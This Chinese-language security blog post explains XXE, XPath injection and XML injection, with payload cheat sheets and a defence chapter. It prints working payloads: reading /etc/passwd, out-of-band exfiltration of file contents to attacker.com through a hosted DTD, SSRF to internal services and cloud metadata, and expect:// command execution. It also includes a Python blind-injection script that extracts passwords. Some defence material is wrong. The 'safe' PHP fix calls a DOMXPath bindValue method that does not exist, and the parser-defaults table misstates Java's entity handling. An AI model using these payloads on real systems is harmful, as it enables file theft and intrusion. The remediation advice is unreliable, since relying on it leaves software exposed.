---
title: XML 漏洞全解：XXE、XPath 注入与 XML 外部实体
date: 2026-06-24 10:00:00
tags:
- XML
- XXE
- XPath
- 注入
- 文件读取
categories:
- 安全研究
---

# XML 漏洞全解：XXE、XPath 注入与 XML 外部实体

> 系统化拆解 XML 相关漏洞的原理、利用与防御

---

## 目录

- [第1章 XML 基础](#第1章-xml-基础)
- [第2章 XXE — XML 外部实体注入](#第2章-xxe--xml-外部实体注入)
- [第3章 XPath 注入](#第3章-xpath-注入)
- [第4章 XML 注入](#第4章-xml-注入)
- [第5章 防御与修复](#第5章-防御与修复)

---

## 第1章 XML 基础

### 1.1 什么是 XML

XML（Extensible Markup Language）是一种标记语言，用于存储和传输数据。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user id="1">
        <name>admin</name>
        <password>123456</password>
    </user>
    <user id="2">
        <name>guest</name>
        <password>guest</password>
    </user>
</users>
```

### 1.2 XML 的四个关键概念

| 概念 | 说明 | 示例 |
|------|------|------|
| **标签** | 数据的标记 | `<user>`、`</user>` |
| **属性** | 标签的附加信息 | `id="1"` |
| **实体** | 变量的占位符 | `&lt;` 表示 `<` |
| **DTD** | 文档类型定义 | `<!DOCTYPE ...>` |

### 1.3 DTD — 文档类型定义

DTD 是用来定义 XML 文档结构的规则，同时也是 **XXE 漏洞的根源**：

```dtd
<!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY xxe "这是一个实体">
]>
```

DTD 中可以定义：
- **内部实体**：`<!ENTITY name "value">`
- **外部实体**：`<!ENTITY name SYSTEM "URL">`  ← 这就是 XXE 的入口
- **参数实体**：`<!ENTITY % name "value">`

---

## 第2章 XXE — XML 外部实体注入

### 2.1 什么是 XXE

XXE（XML External Entity Injection）攻击者利用 XML 解析器对外部实体的支持，读取本地文件、发起 SSRF 请求或执行 DoS 攻击。

**漏洞根因**：XML 解析器在解析 DTD 时，`SYSTEM` 关键字允许从外部 URL 或本地文件加载内容。

### 2.2 XXE 读文件（核心场景）

#### 基本 Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**执行流程**：

```
解析器读到 &xxe; → 查找实体定义 → 发现 SYSTEM "file:///etc/passwd"
                                      → 读取 /etc/passwd 文件内容
                                      → 替换 &xxe; 为文件内容
                                      → 服务器返回文件内容
```

#### 读 PHP 文件（Base64 编码绕过）

对于 PHP 环境，直接读 PHP 文件会被解析执行，需要用 Base64 编码：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

### 2.3 XXE 的三种类型

| 类型 | 说明 | 利用方式 |
|------|------|---------|
| **有回显 XXE** | 文件内容在响应中返回 | 直接替换实体即可 |
| **无回显 XXE** | 文件内容不直接返回 | 带外（OOB）外带 |
| **错误 XXE** | 通过错误信息读取内容 | 构造语法错误让内容出现在错误消息中 |

### 2.4 无回显 XXE（OOB — Out-of-Band）

当页面不返回解析结果时，需要通过 HTTP 请求把数据带出来：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
    <!ENTITY % callhome SYSTEM "http://attacker.com/?data=%xxe;">
    %callhome;
]>
<root>test</root>
```

但是参数实体中不能引用另一个参数实体（某些解析器限制）。需要用 **嵌套 DTD**：

**第一步：攻击者服务器放一个 dtd 文件（evil.dtd）**

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**第二步：Payload 引用外部 DTD**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
    %remote;
]>
<root>test</root>
```

**执行流程**：

```
服务器请求 evil.dtd → 解析 %remote;
    → 定义 %file（读 /etc/passwd）
    → 定义 %eval（动态构造 exfil 实体）
    → 调用 %exfil → 向攻击者服务器发送 /etc/passwd 内容
```

### 2.5 XXE → SSRF

XXE 不仅可以读文件，还可以向内部服务发请求：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">
]>
<root>&xxe;</root>
```

**常用内网探测目标**：

| 服务 | 默认端口 | Payload |
|------|---------|---------|
| Redis | 6379 | `http://127.0.0.1:6379/` |
| MySQL | 3306 | `http://127.0.0.1:3306/` |
| Elasticsearch | 9200 | `http://127.0.0.1:9200/` |
| Docker API | 2375 | `http://127.0.0.1:2375/version` |
| Kubernetes API | 6443 | `https://127.0.0.1:6443/` |
| AWS Metadata | — | `http://169.254.169.254/latest/meta-data/` |

### 2.6 XXE → RCE

#### PHP 环境：`expect://` 协议

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

需要 PHP 安装了 `expect` 扩展。

#### PHP 环境：`php://input` 写文件

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/write=convert.base64-decode/resource=shell.php">
]>
<root>&xxe;</root>
```

#### Java 环境：通过 SSRF + 反序列化 RCE

Java 中的 XXE 一般不能直接 RCE，需要结合 SSRF 打到内网的 Java 反序列化接口。

### 2.7 XXE DoS（Billion Laughs 攻击）

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

`lol9` 展开后约为 **3GB** 文本，直接耗尽服务器内存。

---

## 第3章 XPath 注入

### 3.1 什么是 XPath

XPath 是一种在 XML 文档中查找信息的语言，类似于 SQL 的查询语法：

```xpath
/users/user[name='admin']/password
```

### 3.2 漏洞原理

当用户输入直接拼接到 XPath 查询字符串中时，可以注入 XPath 语法改变查询逻辑。

**漏洞代码示例**：

```php
<?php
$name = $_POST['name'];  // 用户输入直接拼接
$query = "/users/user[name='$name']/password";
$result = xpath_eval($xml, $query);
```

### 3.3 XPath 注入与 SQL 注入的对比

| 对比项 | SQL 注入 | XPath 注入 |
|--------|---------|-----------|
| 查询语言 | SQL | XPath |
| 有无注释符 | `--`、`#` | 无注释符，但有 `parent::`、`/..` |
| UNION | 支持 | 不支持 |
| 堆叠查询 | 部分支持 | 不支持 |
| 绕过认证 | `' OR '1'='1` | `' or '1'='1` |
| 返回值数量 | 一条记录 | 所有匹配节点 |

### 3.4 常用 Payload

#### 绕过认证

```xpath
' or '1'='1
' or true() or '
```

#### 盲注 — 猜解节点名

```xpath
' and string-length(name(/*[1]))>4 and '1'='1
```

#### 盲注 — 猜解节点值长度

```xpath
' and string-length(//user[1]/password/text())>8 and '1'='1
```

#### 盲注 — 逐字符猜解

```xpath
' and substring(//user[1]/password/text(),1,1)='a' and '1'='1
' and substring(//user[1]/password/text(),1,1)='b' and '1'='1
```

#### 读取所有数据（盲注场景）

```xpath
' or '1'='1'] | //* | /foo[bar='1
```

### 3.5 盲注脚本模板

```python
#!/usr/bin/env python3
"""
XPath 盲注脚本 — 逐字符猜解节点值
"""

import requests
import string

TARGET = "http://target.com/login"
CHARSET = string.ascii_lowercase + string.digits

def blind_xpath(position, char):
    payload = f"' and substring(//user[1]/password/text(),{position},1)='{char}' and '1'='1"
    data = {"name": payload, "password": "test"}
    r = requests.post(TARGET, data=data)
    return "success" in r.text  # 根据实际响应调整

password = ""
for pos in range(1, 33):
    for c in CHARSET:
        if blind_xpath(pos, c):
            password += c
            print(f"[+] 第{pos}位: {c} → 当前: {password}")
            break
    else:
        print(f"[*] 第{pos}位未找到，结束")

print(f"[✓] 密码: {password}")
```

---

## 第4章 XML 注入

### 4.1 什么是 XML 注入

XML 注入是指攻击者通过输入特殊字符（`<`、`>`、`&` 等）破坏 XML 结构，插入恶意标签或修改 XML 数据。

### 4.2 场景：XML 数据拼接

**漏洞代码**：

```php
$name = $_POST['name'];  // 用户输入未转义
$xml = "<user><name>$name</name><role>guest</role></user>";
file_put_contents("users.xml", $xml, FILE_APPEND);
```

**攻击者输入**：

```xml
admin</name><role>admin</role></user>
```

**解析后的 XML**：

```xml
<user>
    <name>admin</name>
    <role>admin</role>
</user>
</user>
```

成功将自己的角色提权为 admin。

### 4.3 XML 注入 vs XPath 注入

| 漏洞 | 攻击目标 | 利用方式 |
|------|---------|---------|
| XML 注入 | 破坏/篡改 XML 结构 | 插入标签和属性 |
| XPath 注入 | 篡改查询逻辑 | 注入 XPath 语法 |
| XXE | 读取文件/SSRF | 注入外部实体定义 |

---

## 第5章 防御与修复

### 5.1 XXE 防御

#### Java

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// 彻底禁用外部实体
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// 或者禁用外部通用实体
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
// 禁用外部参数实体
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

#### Python（lxml）

```python
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml_data, parser)
```

#### PHP

```php
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
// ↑ 这两个标志恰恰是开启外部实体的，去掉即可
// 推荐：
$dom->loadXML($xml, LIBXML_NONET);  // 禁止网络访问
```

#### Python（defusedxml）

```python
# defusedxml 是最安全的方案
from defusedxml import minidom, sax, ElementTree

# 替换所有标准库 XML 解析器
minidom.parseString(xml_data)
```

### 5.2 XPath 注入防御

#### 参数化查询

```php
// ❌ 危险：字符串拼接
$xpath = "/users/user[name='$name']/password";

// ✅ 安全：预编译表达式 + 参数绑定
$xpath = new DOMXPath($doc);
$result = $xpath->query("/users/user[name=:name]/password");
$result->bindValue(':name', $name);
```

#### 输入过滤

```php
// 只允许字母数字
if (!preg_match('/^[a-zA-Z0-9_]+$/', $name)) {
    die("Invalid input");
}
```

### 5.3 XML 注入防御

```php
// 转义 XML 特殊字符
$safe_name = htmlspecialchars($name, ENT_XML1 | ENT_QUOTES, 'UTF-8');
// 或
$safe_name = str_replace(
    ['&', '<', '>', '"', "'"],
    ['&amp;', '&lt;', '&gt;', '&quot;', '&apos;'],
    $name
);
```

### 5.4 安全配置对照表

| 配置 | 风险 | 推荐 |
|------|------|------|
| 禁用 DOCTYPE | 阻止所有 DTD 相关攻击 | ✅ 默认开启 |
| 禁用外部实体 | 阻止文件读取 | ✅ 默认开启 |
| 禁用参数实体 | 阻止 OOB XXE | ✅ 默认开启 |
| 禁用外部 DTD | 阻止远程 DTD 加载 | ✅ 生产环境 |
| 禁用 XInclude | 阻止 XInclude 攻击 | ✅ 默认关闭 |

---

## 附录

### A. XXE Payload 速查

```xml
<!-- 读文件 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- 读 PHP 源码 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!-- 读 Java Web 源码 -->
<!ENTITY xxe SYSTEM "file:///WEB-INF/web.xml">

<!-- SSRF 内网探测 -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">

<!-- OOB 外带（配合外部 DTD） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### B. XPath 注入 Payload 速查

```xpath
' or '1'='1                   绕过认证
' or true() or '              绕过认证
' and 1=0 and '1'='1         布尔假
' and 1=1 and '1'='1         布尔真
admin' and string-length(//user[1]/password/text())>8 and '1'='1  测长度
admin' and substring(//user[1]/password/text(),1,1)='a' and '1'='1  逐字符猜
```

### C. 常见的 XML 解析器默认配置风险

| 语言/库 | 默认是否解析实体 | 默认是否网络访问 |
|---------|---------------|----------------|
| PHP SimpleXML | ✅ 是 | ✅ 是 |
| Java DOM | ❌ 否 | ❌ 否 |
| Python xml.etree | ✅ 是 | ❌ 否 |
| Python lxml | ❌ 否 | ❌ 否 |
| C# XmlDocument | ✅ 是 | ✅ 是 |
| libxml2 | ✅ 是 | ✅ 是 |
